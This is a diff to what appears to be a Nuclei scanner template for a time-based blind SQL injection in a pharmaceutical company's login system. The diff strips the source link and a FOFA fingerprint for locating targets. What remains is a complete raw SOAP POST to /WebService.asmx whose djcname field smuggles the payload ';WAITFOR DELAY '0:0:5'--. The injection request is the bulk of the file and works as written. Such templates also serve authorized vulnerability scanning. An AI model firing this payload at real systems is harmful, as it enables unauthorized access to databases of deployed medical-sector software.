@@ -3,14 +3,8 @@ info:
   name: 医药公司登录系统GetLshByTj存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/8a79ddb6692d6af074440ee1cccfdbcb
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 8a79ddb6692d6af074440ee1cccfdbcb
-    fofa: + fofa`body="ResourceScripts/zh-cn-Login.aspx.js"`
 http:
 - raw:
   - "POST /WebService.asmx HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nConnection: close\nCookie: _sid=tp_1700221267_fbf3ff64ee297b12\nUpgrade-Insecure-Requests: 1\nPriority: u=1\nSOAPAction: http://tempuri.org/GetLshByTj\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 454\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:GetLshByTj>\n         <!--type: string-->\n         <tem:tjstr>gero et</tem:tjstr>\n\n         <!--type: string-->\n         <tem:djcname>onoras imperio';WAITFOR DELAY '0:0:5'--</tem:djcname>\n\n         <!--type: boolean-->\n         <tem:redonly>true</tem:redonly>\n\n      </tem:GetLshByTj>\n\n   </soapenv:Body>\n\n</soapenv:Envelope>"
